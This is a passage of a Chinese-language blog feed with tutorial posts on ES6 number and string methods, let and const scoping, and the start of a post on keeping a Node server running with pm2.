true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25.1</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="string">"15"</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="literal">true</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li><li><p>Number.EPSILON()：极小的常量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.EPSILON <span class="comment">// 2.220446049250313e-16</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.EPSILON.toFixed(<span class="number">20</span>) <span class="comment">// '0.00000000000000022204'</span></span><br></pre></td></tr></table></figure><p>因浮点数运算存在误差，引入一个这么小的常量目的在于为浮点数计算设置一个误差范围</p><p>es5中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> <span class="comment">// 0.30000000000000004</span></span><br><span class="line"></span><br><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> - <span class="number">0.3</span> <span class="comment">// 5.551115123125783e-17</span></span><br><span class="line"></span><br><span class="line"><span class="number">5.551115123125783e-17</span>.toFixed(<span class="number">20</span>) <span class="comment">// '0.00000000000000005551'</span></span><br></pre></td></tr></table></figure><p>es6中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.551115123125783e-17</span> &lt; <span class="built_in">Number</span>.EPSILON <span class="comment">// true</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withinErrorMargin</span> (<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.abs(left - right) &lt; <span class="built_in">Number</span>.EPSILON;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">withinErrorMargin(<span class="number">0.1</span> + <span class="number">0.2</span>, <span class="number">0.3</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">withinErrorMargin(<span class="number">0.2</span> + <span class="number">0.2</span>, <span class="number">0.3</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li><li><p>Number.isSafeInteger()：判断一个整数是否落在这个范围之内<br>这个范围：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">JavaScript能够准确表示的整数范围再-2^53到2^53之间（不含两个端点），超过这个范围，无法精确表示</span><br><span class="line"></span><br><span class="line">es5:</span><br><span class="line">```js</span><br><span class="line">Math.pow(2, 53) // 9007199254740992</span><br><span class="line"></span><br><span class="line">9007199254740992  // 9007199254740992</span><br><span class="line"></span><br><span class="line">9007199254740993  // 9007199254740992</span><br><span class="line"></span><br><span class="line">Math.pow(2, 53) === Math.pow(2, 53) + 1 // true</span><br></pre></td></tr></table></figure></p><p>es6:<br>ES6引入了<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```js</span><br><span class="line">Number.MAX_SAFE_INTEGER === Math.pow(2, 53) - 1 // true</span><br><span class="line"></span><br><span class="line">Number.MAX_SAFE_INTEGER === 9007199254740991 // true</span><br><span class="line"></span><br><span class="line">Number.MIN_SAFE_INTEGER === -Number.MAX_SAFE_INTEGER // true</span><br><span class="line"></span><br><span class="line">Number.MIN_SAFE_INTEGER === -9007199254740991 // true</span><br></pre></td></tr></table></figure></p><p>应用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="string">'a'</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="literal">null</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="literal">NaN</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="literal">Infinity</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(-<span class="literal">Infinity</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">3</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">1.2</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">9007199254740990</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">9007199254740992</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="built_in">Number</span>.MIN_SAFE_INTEGER) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="built_in">Number</span>.MIN_SAFE_INTEGER - <span class="number">1</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="built_in">Number</span>.MAX_SAFE_INTEGER) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="built_in">Number</span>.MAX_SAFE_INTEGER + <span class="number">1</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      es6中一些较常使用的数字方法
    
    </summary>
    
    
      <category term="ES6" scheme="http://pimichen.com/blog/tags/es6/"/>
    
  </entry>
  
  <entry>
    <title>ES6 string方法</title>
    <link href="http://pimichen.com/blog/es6/es6-string%E6%96%B9%E6%B3%95.html"/>
    <id>http://pimichen.com/blog/es6/es6-string方法.html</id>
    <published>2018-10-19T16:00:00.000Z</published>
    <updated>2018-10-19T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考：<a href="http://es6.ruanyifeng.com/#docs/string" target="_blank" rel="noopener">阮一峰 ES6 字符串方法</a></p></blockquote><ul><li><p>at(): 返回给定字符的位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello world!'</span>;</span><br><span class="line">s.at(<span class="number">0</span>) <span class="comment">// H</span></span><br></pre></td></tr></table></figure></li><li><p>includes(): 是否包含指定字符串，第二个参数可选，表示起始查找位置</p></li><li><p>startsWith(): 参数是否在头部，第二个参数可选，表示起始查找位置</p></li><li><p>endsWith(): 参数是否在尾部，第二个参数可选，表示起始查找位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello world!'</span>;</span><br><span class="line">s.startsWith(<span class="string">'Hello'</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">'!'</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">'o'</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello world!'</span>;</span><br><span class="line">s.startsWith(<span class="string">'world'</span>, <span class="number">6</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">'Hello'</span>, <span class="number">5</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">'Hello'</span>, <span class="number">6</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li><li><p>repeat(): 返回重复多次后的字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello'</span></span><br><span class="line">s.repeat(<span class="number">3</span>)  <span class="comment">// HelloHelloHello</span></span><br><span class="line">s.repeat(<span class="number">2.9</span>) <span class="comment">// HelloHello，参数为小数时为取整次数</span></span><br><span class="line">s.repeat(<span class="literal">Infinity</span>) <span class="comment">// 报错</span></span><br><span class="line">s.repeat(<span class="number">-1</span>) <span class="comment">// 报错</span></span><br><span class="line">s.repeat(<span class="number">-0.8</span>) <span class="comment">// ""，-1~0取整后为0</span></span><br><span class="line">s.repeat(<span class="string">"2"</span>) <span class="comment">// HelloHell0，字符串先转换成数字再取整</span></span><br><span class="line">s.repeat(<span class="string">"world"</span>) <span class="comment">// ""</span></span><br></pre></td></tr></table></figure></li><li><p>padStart(): 头部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补</p></li><li><p>padEnd(): 尾部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'x'</span></span><br><span class="line">s.padStart(<span class="number">5</span>, <span class="string">'ab'</span>) <span class="comment">// 'ababx'</span></span><br><span class="line">s.padStart(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'abax'</span></span><br><span class="line">s.padStart(<span class="number">4</span>, <span class="string">'abcdefg'</span>) <span class="comment">// 'abcx' ，多余的会被去掉</span></span><br><span class="line">s.padEnd(<span class="number">5</span>, <span class="string">'ab'</span>) <span class="comment">// 'xabab'</span></span><br><span class="line">s.padEnd(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'xaba'  </span></span><br><span class="line">s.padEnd(<span class="number">4</span>, <span class="string">'abcdefg'</span>) <span class="comment">// 'xabc' ，多余的会被去掉</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'xxxx'</span></span><br><span class="line">s.padStart(<span class="number">2</span>, <span class="string">'ab'</span>) <span class="comment">// 'xxxx'，当设置的字符串长度小于原本长度，返回原字符串</span></span><br><span class="line">s.padEnd(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'xxxx' ，当设置的字符串长度小于原本长度，返回原字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'x'</span></span><br><span class="line">s.padStart(<span class="number">3</span>) <span class="comment">// '  x'</span></span><br><span class="line">s.padEnd(<span class="number">4</span>) <span class="comment">//  'x   '</span></span><br><span class="line"></span><br><span class="line">常用来补全位数：</span><br><span class="line"><span class="string">'10'</span>.padStart(<span class="number">10</span>, <span class="string">'0'</span>) <span class="comment">// "0000000010"</span></span><br></pre></td></tr></table></figure></li><li><p>模板字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">传统输出模板：</span><br><span class="line">$(<span class="string">'#result'</span>).append(  </span><br><span class="line">  <span class="string">'There are &lt;b&gt;'</span> + basket.count +</span><br><span class="line">  <span class="string">'&lt;/b&gt; '</span> +  <span class="string">'items in your basket, '</span> +</span><br><span class="line">  <span class="string">'&lt;em&gt;'</span> + basket.onSale +</span><br><span class="line">  <span class="string">'&lt;/em&gt; are on sale!'</span></span><br><span class="line">);  </span><br><span class="line"></span><br><span class="line">es6输出模板：</span><br><span class="line">$(<span class="string">'#result'</span>).append(<span class="string">`</span></span><br><span class="line"><span class="string">  There are &lt;b&gt;<span class="subst">$&#123;basket.count&#125;</span>&lt;/b&gt;</span></span><br><span class="line"><span class="string">  items   in your basket, &lt;em&gt;<span class="subst">$&#123;basket.onSale&#125;</span>&lt;/em&gt;</span></span><br><span class="line"><span class="string">  are on sale!</span></span><br><span class="line"><span class="string">`</span>);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      es6中一些较常使用的字符串方法
    
    </summary>
    
    
      <category term="ES6" scheme="http://pimichen.com/blog/tags/es6/"/>
    
  </entry>
  
  <entry>
    <title>let 和 const</title>
    <link href="http://pimichen.com/blog/es6/es6-let%E5%92%8Cconst%E7%94%A8%E6%B3%95.html"/>
    <id>http://pimichen.com/blog/es6/es6-let和const用法.html</id>
    <published>2018-10-19T16:00:00.000Z</published>
    <updated>2018-10-19T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="let"><a href="#let" class="headerlink" title="let"></a>let</h2><ul><li>只在代码块内有效</li><li><p>不存在变量提升（只能先声明后使用）（变量提升指变量在声明之前使用，值为ReferenceError）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(foo); <span class="comment">// 输出undefined</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(bar); <span class="comment">// 报错ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="number">2</span>;</span><br></pre></td></tr></table></figure></li><li><p>暂时性死区（声明之前变量不可用）（暂时性死区简称“TDZ”）<br>例1：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> tmp = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  tmp = <span class="string">'abc'</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="keyword">let</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例2：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="comment">// TDZ开始</span></span><br><span class="line">  tmp = <span class="string">'abc'</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// ReferenceError</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> tmp; <span class="comment">// TDZ结束</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">  tmp = <span class="number">123</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// 123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typeof x; // ReferenceError</span><br><span class="line">let x;</span><br></pre></td></tr></table></figure></li><li><p>不允许重复申明（不允许在相同作用域内重复声明同一个变量）<br>例1：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例2：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arg; <span class="comment">// 报错</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> arg; <span class="comment">// 不报错</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>let新增块级作用域</p><ul><li>ES5只有全局作用域和函数作用域</li><li><p>ES5函数只能在顶层作用域和函数作用域内声明，不能在块级作用域内声明</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES5 情况一：非法</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5 情况二：非法</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在块级作用域内，函数声明语句的行为类似于let，在块级作用域之外不可引用，对作用域之外并不会影响</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于本例：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'I am outside!'</span>); &#125;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  </span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;   </span><br><span class="line">   <span class="comment">// 重复声明一次函数f    </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'I am inside!'</span>); &#125;   </span><br><span class="line">  &#125;  </span><br><span class="line"> f();</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES5实际运行代码：结果为：I am inside!</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'I am outside!'</span>);  &#125;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'I am inside!'</span>); &#125;   </span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;   </span><br><span class="line">  &#125;  </span><br><span class="line"> f();</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES6实际运行代码：结果为：I am outside!</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'I am outside!'</span>);  &#125;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  </span><br><span class="line"> f();</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><p>声明常量，不可变指的是该常量指向的地址，而不是常量本身</p><ul><li><p>const声明一个只读的常量，一旦声明，常量的值就不能改变</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PI = <span class="number">3.1415</span>;</span><br><span class="line">PI <span class="comment">// 3.1415</span></span><br><span class="line"></span><br><span class="line">PI = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// TypeError: Assignment to constant variable.</span></span><br></pre></td></tr></table></figure></li><li><p>const一旦声明变量，就必须立即初始化，不能等到以后赋值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo;</span><br><span class="line"><span class="comment">// SyntaxError: Missing initializer in const declaration</span></span><br></pre></td></tr></table></figure></li><li><p>只在声明所在的块级作用域内有效</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> MAX = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MAX <span class="comment">// Uncaught ReferenceError: MAX is not defined</span></span><br></pre></td></tr></table></figure></li><li><p>const声明的常量也不存在变量提升</p></li><li>存在暂时性死区</li><li>只能先声明后使用</li><li>不可重复声明</li><li><p>对于复合类型的变量，变量名不指向数据，而是指向数据所在的地址。即const命令只是保证变量名指向的地址不变，而不是保证数据不变，所以使用const声明为常量必须小心。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = &#123;&#125;;</span><br><span class="line">foo.prop = <span class="number">123</span>;</span><br><span class="line">foo.prop</span><br><span class="line"><span class="comment">// 123</span></span><br><span class="line">foo = &#123;&#125;; <span class="comment">// TypeError: "foo" is read-only</span></span><br></pre></td></tr></table></figure><p>上例中：常量foo存储的是一个地址，这个地址指向一个对象。所谓不可变的是这个地址，不能把foo指向另一个地址，但是该对象本身是可变的，可以为这个对象添加新属性等</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = [];</span><br><span class="line">a.push(<span class="string">'Hello'</span>); <span class="comment">// 可执行</span></span><br><span class="line">a.length = <span class="number">0</span>;    <span class="comment">// 可执行</span></span><br><span class="line">a = [<span class="string">'Dave'</span>];    <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>上例中：常量a是一个数组，这个数组本身是可写的，但是将另一个数组赋给a，就会报错，因为改变了a指向的地址</p></li></ul><h2 id="ES6其他声明变量的方法"><a href="#ES6其他声明变量的方法" class="headerlink" title="ES6其他声明变量的方法"></a>ES6其他声明变量的方法</h2><p>共6中声明变量的方法:</p><ul><li>ES5两种：var 和 function</li><li>ES6新增的：let 和 const</li><li>ES6其他：import 和 class</li></ul>]]></content>
    
    <summary type="html">
    
      ES6中的let和const用法
    
    </summary>
    
    
      <category term="ES6" scheme="http://pimichen.com/blog/tags/es6/"/>
    
  </entry>
  
  <entry>
    <title>使用pm2永久开启node服务器</title>
    <link href="http://pimichen.com/blog/node/%E4%BD%BF%E7%94%A8pm2%E6%9D%A5%E6%B0%B8%E4%B9%85%E5%BC%80%E5%90%AFnode%E6%9C%8D%E5%8A%A1%E5%99%A8.html"/>
    <id>http://pimichen.com/blog/node/使用pm2来永久开启node服务器.html</id>
    <published>2018-07-20T16:00:00.000Z</published>
    <updated>2018-07-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>前言：我们知道在跑node程序的时候，我们需要开启一个终端来执行node的命令，当终端关闭时，node服务器也相应的关闭了，如何保持node服务器的永久开启而不依赖窗口呢？</p><p>使用<a href="http://pm2.keymetrics.io/docs/usage/quick-start/#usage" target="_blank" rel="noopener">pm2</a>可以永久开启node服务器而不受终端窗口的限制，pm2 是一个带有负载均衡功能的Node应用的进程管理器.当你要把你的独立代码利用全部的服务器上的所有CPU，并保证进程永远都活着，0秒的重载， pm2是完美的。</p><p>1、全局安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install pm2@latest -g</span><br></pre></td></tr></table></figure></p><p>2、举例<br>如使用<code>vue-cli</code>工具时我们需要用到<code>npm run dev</code>命令，我们知道，执行的其实下面的<code>node build/dev-server.js</code>命令<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"scripts"</span>: &#123;</span><br><span class="line">  <span class="string">"dev"</span>: <span class="string">"node build/dev-server.js"</span>,</span><br><span class="line">  <span class="string">"build"</span>: <span class="string">"node build/build.js"</span>,</span><br><span class="line">  <span class="string">"test"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="string">"lint"</span>: <span class="string">"eslint --ext .js,.vue src"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以使用<code>pm2</code>来替代运行上面的程序</p><ul><li><p>方法1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start build/dev-server.js</span><br></pre></td></tr></table></figure><p>当我们启动一个程序的时候，会看到：<br><img 